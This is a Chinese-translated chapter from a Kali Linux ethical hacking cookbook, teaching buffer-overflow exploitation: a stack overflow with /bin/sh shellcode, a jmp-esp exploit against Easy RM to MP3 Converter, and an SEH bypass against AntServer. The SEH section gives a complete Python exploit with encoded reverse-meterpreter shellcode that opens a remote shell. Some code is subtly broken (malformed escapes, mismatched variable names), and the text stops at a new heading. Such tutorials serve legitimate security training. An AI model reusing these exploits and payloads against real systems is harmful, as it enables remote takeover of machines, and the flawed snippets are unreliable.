# Kali Linux：道德黑客秘籍（三）

> 原文：[`annas-archive.org/md5/7F6D5A44FB1E50E1F70AA8207514D628`](https://annas-archive.org/md5/7F6D5A44FB1E50E1F70AA8207514D628)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第九章：缓冲区溢出

在本章中，我们将涵盖以下内容：

+   利用基于堆栈的缓冲区溢出

+   利用真实软件的缓冲区溢出

+   SEH 绕过

+   利用 egg hunters

+   ASLR 和 NX 绕过的概述

# 介绍

在软件程序中，当程序在向缓冲区写入数据时，超出了分配的缓冲区大小，并开始向相邻的内存位置覆盖数据时，就会发生缓冲区溢出。

缓冲区可以被认为是分配给程序的内存中的临时区域，用于在需要时存储和检索数据。

长期以来已知缓冲区溢出已被利用。

在利用缓冲区溢出时，我们的主要关注点是覆盖一些控制信息，以便程序的控制流发生变化，这将允许我们的代码控制程序。

这是一个图表，将给我们一个关于缓冲区溢出发生的基本概念：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/edcf143a-1eb8-44ce-b001-e0f59b5f229c.png)

从前面的图表中，我们可以假设这就是一个程序的样子。因为它是一个堆栈，它从底部开始，向堆栈的顶部移动。

从前面的图表中，我们还注意到程序有一个固定的缓冲区来存储 16 个字母/字节的数据。

我们首先输入 8 个字符（*1 个字符=1 个字节*）；在图表的右侧，我们可以看到它们已经被写入程序内存的缓冲区中。

让我们看看当我们向程序写入 20 个字符时会发生什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5f33b307-ee03-4cb4-8ed2-f4d10fc4b5b1.png)

来源：http://www.cbi.umn.edu/

我们可以看到数据被正确地写入了 16 个字符，但最后的 4 个字符现在已经超出了缓冲区，并覆盖了程序的**返回地址**中存储的值。这就是经典的缓冲区溢出发生的地方。

让我们看一个实际例子；我们将使用一个示例代码：

```
#include <stdio.h> 
#include <string.h> 
#include <stdlib.h> 
int main(int argc, char *argv[]) 
{ 
    char buffer[5]; 
    if (argc < 2) 
        { 
            printf("strcpy() NOT executed....\n"); 
            printf("Syntax: %s <characters>\n", argv[0]); 
            exit(0); 
        } 
    strcpy(buffer, argv[1]); 
    printf("buffer content= %s\n", buffer); 

    // you may want to try strcpy_s() 
    printf("strcpy() executed...\n"); 
    return 0; 
} 
```

前面的程序简单地在运行时接受一个输入，并将其复制到一个名为`buffer`的变量中。我们可以看到变量缓冲区的大小设置为`5`。

现在我们使用这个命令进行编译：

```
gcc program.c -o program
```

我们需要小心，因为`gcc`默认具有内置的安全功能，可以防止缓冲区溢出。

我们使用这个命令运行程序：

```
./program 1234  
```

我们看到它已经存储了数据，我们得到了输出。

现在让我们运行这个：

```
./program 12345   
```

我们会看到程序以分段错误退出。这是`gcc`的启用安全功能。

我们将在下一节中更多地了解返回地址。然而，用我们自己的代码覆盖返回地址可以导致程序的行为与通常执行不同，并帮助我们利用这个漏洞。

模糊测试是发现程序中缓冲区溢出最简单的方法。Kali 中有各种模糊测试工具，或者我们可以根据程序类型编写自定义脚本。

一旦模糊测试完成并发生崩溃，我们的下一步是调试程序，找到程序崩溃的确切部分以及如何利用它来获利。

在线也有多个调试器可用。我个人在 Windows 上最喜欢的是 Immunity Debugger（Immunity Inc.）。Kali 也带有一个内置的调试器 GDB。这是一个命令行调试器。

在我们进一步探讨更激动人心的话题之前，请注意通常在程序中会发生两种类型的溢出。

主要有两种类型的缓冲区溢出：

+   基于堆栈的溢出

+   基于堆栈的溢出

我们将在本章的后面更详细地涵盖这些内容。现在，让我们澄清一些基础知识，这将帮助我们利用溢出漏洞。

# 利用基于堆栈的缓冲区溢出

现在我们的基础知识已经清楚，让我们继续学习基于堆栈的缓冲区溢出的利用。

# 如何做...

以下步骤演示了基于堆栈的缓冲区溢出：

1.  让我们看另一个简单的 C 程序：

```
        #include<stdio.h> 
        #include<string.h> 
        void main(int argc, char *argv[]) 
        { 
            char buf[120]; 
            strcpy(buf, argv[1]); 
            printf(buf); 
        }  
```

这个程序使用了一个有漏洞的方法`strcyp()`。我们将程序保存到一个文件中。

1.  然后我们使用`gcc`编译程序，使用`fno-stack-protector`和`execstack`：

```
 gcc -ggdb name.c -o name -fno-stack-protector -z execstack
```

1.  接下来，我们关闭地址空间随机化：

```
 echo 0 > /proc/sys/kernel/randomize_va_space
```

1.  现在我们使用以下命令在`gdb`中打开我们的程序：

```
 gdb ./name
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bc9e7142-0794-46bb-bdf8-322a513388d9.png)

1.  接下来，我们使用 Python 使用以下命令输入我们的输入：

```
 r $(python -c 'print "A"*124')
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/985cb9a0-5002-4993-8d7c-8a3e7d86131f.png)

1.  我们可以看到程序崩溃并显示错误`0x41414141`。这意味着我们输入的字符`A`覆盖了 EIP。

1.  我们通过输入`i r`来确认：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/572fdc5f-2ff5-4bba-b6b4-48eef12325d2.png)

1.  这告诉我们 EIP 寄存器的值已经成功被覆盖。

1.  接下来，我们找到覆盖 EIP 的确切字节。我们可以通过在程序中输入不同的字符，然后检查哪个字符覆盖了 EIP 来做到这一点。

1.  因此，我们再次运行程序，这次使用不同的字符：

```
 r $(python -c 'print "A"*90+"B"*9+"C"*25')
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4d8bbcd1-9a6d-4e1f-99a5-b262105e0777.png)

1.  这一次，我们看到 EIP 的值是`CCCC`。这意味着我们需要的字节在我们提供的最后 25 个字符中的某个位置。

1.  类似地，我们尝试不同组合的 124 个字符，直到找到确切覆盖 EIP 的 4 个字符的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/691d6b8d-bcf4-4aa5-8019-8f9c0dd9c747.png)

1.  现在，既然我们已经找到了 EIP 的确切位置，并且为了执行成功的利用，我们需要用我们将存储 shellcode 的内存地址覆盖这 4 个字节。我们的内存中有大约 100 个字节，其中当前存储着`A`，这对我们的 shellcode 来说已经足够了。因此，我们需要在调试器中添加断点，在跳转到下一条指令之前停下来。

1.  我们使用`list 8`命令列出程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8a365f60-2e6a-4b5a-bfd1-75914c58fb8b.png)

1.  然后我们在调用函数的行和调用后使用`b <linenumber>`添加我们的断点。

1.  现在我们再次运行程序，它将在断点处停止：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/42088718-8f43-41a1-b036-46c996900a12.png)

1.  我们按下`c`以继续。

1.  现在让我们看一下`esp`（堆栈指针）寄存器：

```
 x/16x $esp
```

以下截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d1300130-681f-494a-8359-b08e0d3730e9.png)

1.  这将向我们展示`esp`寄存器之后的 16 个字节，在左侧列中，我们将看到与存储的数据对应的内存地址。

1.  在这里，我们看到数据从地址`0xbffff190`开始。我们注意到下一个内存地址`0xbfff1a0`。这是我们将用来写入 EIP 的地址。当程序覆盖 EIP 时，它将使其跳转到这个地址，我们的 shellcode 将存储在这里：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e448340f-ef70-4c50-8128-34e5fff7bfec.png)

1.  让我们尝试通过利用溢出来打开一个 shell。我们可以在 Google 上找到将为我们执行 shell 的 shellcode：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c42bb2b9-3caa-4f65-8a04-43f7eff0c8e1.png)

1.  我们有 100 个字节，我们的 shellcode 是 24 个字节。我们可以在我们的利用中使用这个。

1.  现在我们简单地用`90` no op 汇编指令（`0x90`）替换`A`，并用 shellcode 替换其余的 24 个字节，然后用我们希望 EIP 指向的内存地址替换`B`，用 no op 代码替换`C`。这应该看起来像这样：

```
 "\x90"*76+"\x6a\x0bx58x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\
        x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
        +"\xa0\xff\xf1\xbf"+"\x90"*20
```

1.  让我们重新运行程序并将其作为输入：

```
 r $(python -c print' "\x90"*76+"\x6a\x0bx58x31\xf6\x56\x68\
        x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\
        xcd\x80"+"\xa0\xff\xf1\xbf"+"\x90"*20')
```

1.  我们输入`c`以从断点继续，一旦执行完成，我们的 shell 就会被执行。

# 利用真实软件的缓冲区溢出

您之前已经学习了利用的基础知识。现在让我们尝试在一些早已被利用并且有公开利用的软件上进行尝试。在这个示例中，您将了解旧软件的公开利用以及为其创建自己版本的利用。

在开始之前，我们需要一个旧版本的 Windows 操作系统（最好是 Windows XP）和一个 Windows 调试器。我使用了 Immunity Debugger 和一个已知的缓冲区溢出漏洞的旧软件。我们将使用*Easy RM to MP3 Converter*。这个版本在播放大型 M3U 文件时存在缓冲区溢出漏洞。

# 准备工作

Immunity Debugger 的免费版本可以在[`www.immunityinc.com/products/debugger/`](https://www.immunityinc.com/products/debugger/)上下载。 

# 如何做...

按照给定的步骤来学习：

1.  接下来，我们下载并在机器上安装我们的 MP3 转换器。

1.  这个转换器在播放 M3U 文件时存在漏洞。当使用它打开一个大文件进行转换时，软件会崩溃。

1.  让我们创建一个文件，里面写入大约 30,000 个`A`，并将其保存为`<filename>.m3u`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2237b2f9-0aa0-4912-80e7-01c65bcc2b91.png)

1.  然后，我们将文件拖放到播放器中，我们会看到它崩溃了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/24084d91-a809-4a7c-a5e6-bb289d7855aa.png)

1.  现在我们需要找到导致崩溃的确切字节数。

1.  在文件中手动输入这么多`A`将会花费很长时间，所以我们写一个简单的 Python 程序来代替我们做这件事：

```
        import io
        a="A"*30000
        file =open("crash.m3u","w")
        file.write(a)
        file.close()
```

1.  现在我们玩弄字节，找到崩溃的确切值。

1.  在我们的情况下，由于程序在 26,104 字节处没有崩溃，所以它的长度是 26,105：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ff14a5e0-2a9f-4c2a-8ac8-4b2cf31e5ee6.png)

1.  现在，我们运行我们的调试器，并通过导航到 File | Attach 将正在运行的转换程序附加到它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d6ee96ff-ee75-41e1-9695-f6e2d1bb137d.png)

1.  然后，我们从正在运行的程序列表中选择进程名称：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/37bb1dd1-3b80-4193-8bc9-d4198c05a5e5.png)

1.  一旦附加成功，我们就在程序中打开我们的 M3U 文件。我们将在调试器的状态栏中看到一个警告。我们只需按下*F9*键或点击顶部菜单栏上的播放按钮继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2b1bd8d3-d2fb-4640-8104-cbfe0677069d.png)

1.  我们会看到 EIP 被`A`覆盖，并且程序崩溃了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/57f2063e-3b69-42d4-a4ce-3df272fdadad.png)

1.  现在我们需要找到导致崩溃的确切 4 个字节。我们将使用 Kali 中称为*pattern create*的脚本。它会为我们想要的字节数生成一个唯一的模式。

1.  我们可以使用 locate 命令找到脚本的路径：

```
 locate pattern_create
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/c52b2870-f2a2-42dd-91f8-51a6a93423f0.png)

1.  现在我们知道了路径，我们运行脚本并传递字节数：

```
 ruby /path/to/script/pattern_create.rb 5000
```

1.  我们使用 5,000 是因为我们已经知道它不会在 25,000 处崩溃，所以我们只为接下来的 5,000 字节创建一个模式。

1.  我们有了我们的唯一模式。我们现在将其粘贴到我们的 M3U 文件中，再加上 25,000 个`A`。

1.  我们打开我们的应用程序，并将进程附加到我们的调试器上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9da7ca5f-52ae-4996-abf2-c5e624cfe55c.png)

1.  然后我们将我们的 M3U 文件拖放到程序中。

1.  它崩溃了，我们的 EIP 被 42386b42 覆盖了。

1.  Metasploit 有另一个很棒的脚本来找到偏移的位置：

```
 ruby /path/to/script/pattern_offset.rb 5000
```

1.  现在我们在`1104`处找到了偏移匹配；将其加到 25,000 个`A`上，我们现在知道 EIP 在 26,104 字节后被覆盖：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a66fd3d6-f421-4b69-8373-154c3d24ad26.png)

1.  接下来，我们需要找到一个可靠的方法来跳转到 shellcode。我们通过在 EIP 之后简单地写入额外的随机字符到堆栈中，确保我们写入的 shellcode 将被正确地写入内存。

1.  我们运行程序，将其附加到调试器，并让它崩溃。

1.  我们将看到 EIP 已经成功被覆盖。在右下角的窗口中，我们右键单击并选择 Go to ESP：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fc1958bb-6806-4d8b-993e-5d8e1efda69c.png)

1.  在这里，我们注意到 ESP 实际上是从第 5 个字节开始的。为了确保我们的 shellcode 能够正确执行，我们现在需要确保 shellcode 在 4 个字节之后开始。我们可以插入四个 NOP 来修复这个问题：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/23e8cfb9-541d-4e8e-8896-63b9bdec3c24.png)

1.  由于我们控制了 EIP，有多种方法可以执行我们的 shellcode，我们将在这里介绍其中两种。第一种方法很简单：我们在代码中找到`jmp esp`指令并用它覆盖地址。要做到这一点，我们右键单击并导航到搜索 | 所有模块中的所有命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f18c4ddb-e46a-4e5f-aec8-1f44eb248d02.png)

1.  我们输入`jmp esp`指令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/919c5b9a-9e80-4612-913d-db6e215b8f8e.png)

1.  在结果框中，我们看到我们的指令，并复制地址用于我们的利用。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/976f95ba-72d9-4eff-b9be-673c1aeca92e.png)

1.  现在让我们编写一个利用。基本概念将是`垃圾字节 + 跳转 ESP 的地址 + NOP 字节 + Shellcode`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/505d2867-3bd2-4f61-b10e-fa7058d6d247.png)

1.  我们可以生成计算器的 shellcode：

```
 msfvenom windows/exec CMD=calc.exe R | msfencode -b
        '\x00\x0A\x0D' -t c
```

1.  现在我们运行利用，当程序崩溃时，我们应该看到计算器打开！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f66e9a99-f581-456c-95d9-a005e49b0e74.png)

1.  让我们尝试另一种方法；假设没有`jmp` esps 可供我们使用。在这种情况下，我们可以使用`push esp`，然后使用`ret`指令，它将将指针移动到堆栈的顶部，然后调用`esp`。

1.  我们遵循相同的步骤直到*步骤 25*。然后，我们右键单击并转到搜索 | 所有模块中的所有序列。

1.  在这里，我们输入`push esp ret`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bb49615b-16b0-447a-bbba-38ac7012266e.png)

1.  在结果中，我们看到地址中有序列：`018F1D88`。

1.  现在我们只需用我们的利用代码中的 EIP 地址替换它并运行利用，我们应该打开一个计算器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b6a07761-4b4d-4742-b69f-aa38900d5c6c.png)

# SEH 绕过

在开始之前，我们需要了解 SEH 是什么。**SEH**代表**结构化异常处理**。我们可能经常看到程序弹出一个错误，说*软件遇到问题需要关闭*。这基本上意味着 Windows 的默认异常处理程序开始起作用。

SEH 处理程序可以被认为是在程序中出现异常时按顺序执行的`try`和`catch`语句块。这是典型的 SEH 链的样子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6f9ef080-d0b9-4e2f-86c9-86aafce20782.png)

https://www.corelan.be/wp-content/uploads/2009/07/image_thumb45.png

当发生异常时，SEH 链会出手处理异常，根据其类型处理异常。

因此，当发生非法指令时，应用程序有机会处理异常。如果应用程序中没有定义异常处理程序，我们将看到 Windows 显示的错误：类似于发送报告给 Microsoft。

要成功利用具有 SEH 处理程序的程序，我们首先尝试用我们的缓冲区填充堆栈，然后尝试覆盖存储第一个 SEH 记录链的内存地址。然而，这还不够；我们还需要生成一个错误，这将实际触发 SEH 处理程序，然后我们将能够完全控制程序的执行流程。一个简单的方法是一直填充堆栈，直到底部，这将创建一个需要处理的异常，而且由于我们已经控制了第一个 SEH 记录，我们将能够利用它。

# 如何做到...

在这个教程中，您将学习如何做到这一点：

1.  让我们下载一个名为 AntServer 的程序。它有很多公开的漏洞利用可用，我们将尝试为其构建我们自己的利用。

1.  我们将其安装在我们在上一个教程中使用的 Windows XP SP2 机器上。

1.  AntServer 存在一个漏洞，可以通过向运行在端口`6600`上的 AntServer 发送一个长的 USV 请求来触发：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ea4fd8f1-96bc-4169-b405-16cdfaa4739f.png)

1.  让我们通过打开软件并导航到服务器 | 运行服务控制...来运行 AntServer：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/110334f7-16d2-4b7d-9747-fe7014451572.png)

1.  现在让我们编写一个简单的 Python 脚本，将一个大请求发送到端口`6600`的服务器：

```
        #!/usr/bin/pythonimport socket
        import socket
        address="192.168.110.6"
        port=6660    
        buffer = "USV " + "\x41" * 2500 + "\r\n\r\n"
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=sock.connect((address, port))
        sock.send(buffer)
        sock.close()
```

1.  回到 Windows 机器，让我们启动 Immunity Debugger 并将进程`AntServer.exe`附加到它上。然后，点击`Run`。

1.  一旦程序运行，我们从 Kali 运行我们的 Python 脚本，在我们的调试器中，我们会看到一个违规错误。然而，我们的 EIP 还没有被覆盖：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/76b1c96e-24e2-4ee9-8a55-2bf78cd130bc.png)

1.  在调试器的文件菜单中，我们转到查看| SEH 链。在这里，我们会看到地址已被`AAAA`覆盖。现在我们按*Shift*+ *F9*将一个异常传递给程序。我们会看到 EIP 已经被覆盖，并且我们会收到一个错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/77e531fa-d148-4908-9c41-8ad662900580.png)

1.  我们还会注意到其他寄存器的值现在已经变为零。这种寄存器清零是在 Windows XP SP1 及以后引入的，以使 SEH 利用变得更加困难。

1.  我们正在使用 Windows XP SP2。它有一个名为**SAFESEH**的功能。当这个选项在模块中启用时，只有注册的 SEH 处理程序列表中列出的内存地址才能被使用，这意味着如果我们使用任何不在列表上的地址，来自使用`/SAFESEH ON`编译的模块，SEH 地址将不会被 Windows 异常处理程序使用，SEH 覆盖将失败。

1.  有几种方法可以绕过这个问题，这是其中一种：使用一个没有使用`/SAFESEH ON`或`IMAGE_DLLCHARACTERISTICS_NO_SEH`选项编译的模块的覆盖地址。

1.  为了找到这个，我们将使用一个名为**mona**的 Immunity Debugger 插件。它可以从[`github.com/corelan/mona`](https://github.com/corelan/mona)下载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a4e6fef0-c9bd-4a0a-ab80-631458aa0a24.png)

1.  我们只需将 Python 文件复制到 Immunity 应用程序的`PyCommands`文件夹中。

1.  让我们继续制作利用程序。我们已经看到 EIP 已经被覆盖。现在我们将尝试使用 Kali Linux 中的模式创建脚本找到崩溃发生的确切字节：

```
 ruby /path/to/script/pattern_create.rb -l 2500
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2a92070e-e7f6-4ebc-8139-733ababfc285.png)

1.  代码应该是这样的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/79e71616-6b73-4c64-8b4a-8c51bfda71b0.png)

1.  现在我们运行这个文件，在 Immunity Debugger 中，我们会看到访问违规错误。现在我们去查看| SEH 链。

1.  我们会看到我们的 SEH 已经被覆盖了。我们复制`42326742`的值，并使用 Kali 中的`pattern_offset`脚本找到它的位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/627727a0-1665-449e-b580-bf31f157d06f.png)

```
 ruby /path/to/script/pattern_offset.rb -q 423267412
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/09a3a41d-f031-4c46-b222-106ce855f3e9.png)

1.  我们会看到偏移量为`966`字节，处理程序被覆盖的位置。

1.  现在让我们稍微修改我们的利用程序，看看会发生什么。我们有`966`字节；我们将使用`962`字节的 A 和 4 字节的断点，再用 4 个 B，剩下的字节用 C 来看看会发生什么：

```
        #!/usr/bin/python
        import socket address="192.168.110.12"
        port=6660 buffer = "USV "
        buffer+= "A" * 962
        buffer+= "\xcc\xcc\xcc\xcc"
        buffer+= "BBBB"
        buffer+= "C" * (2504 - len(buffer))
        buffer+= "\r\n\r\n"
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=sock.connect((target_address,target_port)) 
        sock.send(buffer)
        sock.close()
```

1.  我们运行这个并查看 SEH 链。在这里，我们会注意到一个有趣的事情：我们添加的前 4 个断点实际上已经覆盖了一个内存地址，接下来的 4 个已经被覆盖到我们的 SEH 处理程序中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9923fd87-3710-4aa9-ac11-2a4873962b40.png)

这是因为 SEH 是一个指针，指向发生异常时代码存储的内存地址。

1.  让我们将异常传递给程序，我们会看到 EIP 已经被覆盖，但当我们查看内存时，我们会看到我们的 Cs 在内存中的 Bs 之后大约写入了 6 个字节。我们可以使用`POP RET`后跟一个短的`JUMP`代码来跳转到我们的 shellcode。

1.  我们在调试器的控制台中输入`!safeseh`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e5fe1f24-019f-47fb-b5ac-841de81bcc5e.png)

1.  这将显示所有未使用`SAFESEH/ON`编译的 DLL 的列表。在日志窗口中，我们将看到函数的列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6732dd8a-5f97-4211-97bb-3ba05ebc9e64.png)

1.  让我们使用一个名为`vbajet32.dll`的 DLL。我们的目标是在 DLL 中找到一个`POP POP RET`序列，我们可以用它来绕过 SEH。

1.  我们在 Windows 机器上找到我们的 DLL 并将其复制到 Kali。Kali 还有另一个很棒的工具，称为`msfpescan`，可以用来在 DLL 中查找`POP POP RET`序列：

```
 /path/to/msfpescan -f vbajet32.dll -s
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/227092fd-5f40-4a32-b23e-d3b72b31bfb9.png)

1.  在这里，我们有所有`.dll`中`POP POP RET`序列的地址。我们将使用第一个`0x0f9a1f0b`。我们还需要一个短的`JUMP`代码，它将导致跳转到我们的 shellcode 或存储在内存中的 Cs。

1.  短`JUMP`是`\xeb\x06`，其中`06`是我们需要跳转的字节数。我们仍然缺少 4 字节地址空间的 2 个字节，我们可以使用 2 个 NOPs。

1.  让我们创建一个 shellcode；因为我们将通过 HTTP 发送这个 shellcode，所以我们需要确保避免坏字符。我们将使用 msfvenom：

```
 msfvenom -p windows/meterpreter/reverse_tcp -f py
        -b "\x00\xff\x20\x25\x0a\x-d" -v buffer
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4a72551c-1e19-414f-a9f1-33d95e744367.png)

1.  我们将把所有东西放在利用中，如下所示：

```
        #!/usr/bin/python
        import socket
        target_address="192.168.110.12"
        target_port=6660
        buffer = "USV "
        buffer += "\x41" * 962 #offset
        # 6 Bytes SHORT jump to shellcode
        buffer += "\xeb\x06\x90\x90"
        # POP+POP+RET 0x0f9a196a
        buffer += "\x6a\x19\x9a\x0f"
        buffer += "\x90" * 16
        #Shellcode Reverse meterpreter.
        buffer += "\xdb\xde\xd9\x74\x24\xf4\xbf\xcf\x9f\xb1\x9a\x5e"
        buffer += "\x31\xc9\xb1\x54\x83\xee\xfc\x31\x7e\x14\x03\x7e"
        buffer += "\xdb\x7d\x44\x66\x0b\x03\xa7\x97\xcb\x64\x21\x72"
        buffer += "\xfa\xa4\x55\xf6\xac\x14\x1d\x5a\x40\xde\x73\x4f"
        buffer += "\xd3\x92\x5b\x60\x54\x18\xba\x4f\x65\x31\xfe\xce"
        buffer += "\xe5\x48\xd3\x30\xd4\x82\x26\x30\x11\xfe\xcb\x60"
        buffer += "\xca\x74\x79\x95\x7f\xc0\x42\x1e\x33\xc4\xc2\xc3"
        buffer += "\x83\xe7\xe3\x55\x98\xb1\x23\x57\x4d\xca\x6d\x4f"
        buffer += "\x92\xf7\x24\xe4\x60\x83\xb6\x2c\xb9\x6c\x14\x11"
        buffer += "\x76\x9f\x64\x55\xb0\x40\x13\xaf\xc3\xfd\x24\x74"
        buffer += "\xbe\xd9\xa1\x6f\x18\xa9\x12\x54\x99\x7e\xc4\x1f"
        buffer += "\x95\xcb\x82\x78\xb9\xca\x47\xf3\xc5\x47\x66\xd4"
        buffer += "\x4c\x13\x4d\xf0\x15\xc7\xec\xa1\xf3\xa6\x11\xb1"
        buffer += "\x5c\x16\xb4\xb9\x70\x43\xc5\xe3\x1c\xa0\xe4\x1b"
        buffer += "\xdc\xae\x7f\x6f\xee\x71\xd4\xe7\x42\xf9\xf2\xf0"
        buffer += "\xa5\xd0\x43\x6e\x58\xdb\xb3\xa6\x9e\x8f\xe3\xd0"
        buffer += "\x37\xb0\x6f\x21\xb8\x65\x05\x24\x2e\x46\x72\x48"
        buffer += "\xa5\x2e\x81\x95\xa8\xf2\x0c\x73\x9a\x5a\x5f\x2c"
        buffer += "\x5a\x0b\x1f\x9c\x32\x41\x90\xc3\x22\x6a\x7a\x6c"
        buffer += "\xc8\x85\xd3\xc4\x64\x3f\x7e\x9e\x15\xc0\x54\xda"
        buffer += "\x15\x4a\x5d\x1a\xdb\xbb\x14\x08\x0b\xda\xd6\xd0"
        buffer += "\xcb\x77\xd7\xba\xcf\xd1\x80\x52\xcd\x04\xe6\xfc"
        buffer += "\x2e\x63\x74\xfa\xd0\xf2\x4d\x70\xe6\x60\xf2\xee"
        buffer += "\x06\x65\xf2\xee\x50\xef\xf2\x86\x04\x4b\xa1\xb3"
        buffer += "\x4b\x46\xd5\x6f\xd9\x69\x8c\xdc\x4a\x02\x32\x3a"
        buffer += "\xbc\x8d\xcd\x69\xbf\xca\x32\xef\x9d\x72\x5b\x0f"
        buffer += "\xa1\x82\x9b\x65\x21\xd3\xf3\x72\x0e\xdc\x33\x7a"
        buffer += "\x85\xb5\x5b\xf1\x4b\x77\xfd\x06\x46\xd9\xa3\x07"
        buffer += "\x64\xc2\xb2\x89\x8b\xf5\xba\x6b\xb0\x23\x83\x19"
        buffer += "\xf1\xf7\xb0\x12\x48\x55\x90\xb8\xb2\xc9\xe2\xe8"
        # NOP SLED
        buffer += "\x90" * (2504 - len(buffer))
        buffer += "\r\n\r\n"
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=sock.connect((target_address,target_port))
        sock.send(buffer)
        print "Sent!!"
        sock.close()
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7a5ad769-7b63-423a-8e12-8068eeaf83ec.png)

1.  这次我们不使用调试器运行。我们将在 Kali 中打开我们的处理程序，然后我们应该有 meterpreter 访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/44862fbb-f064-4d32-b21d-026f52f9e59d.png)

# 另请参阅

+   [`www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/`](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)

+   [`resources.infosecinstitute.com/bypassing-seh-protection-a-real-life-example/`](http://resources.infosecinstitute.com/bypassing-seh-protection-a-real-life-example/)

# 利用蛋猎手

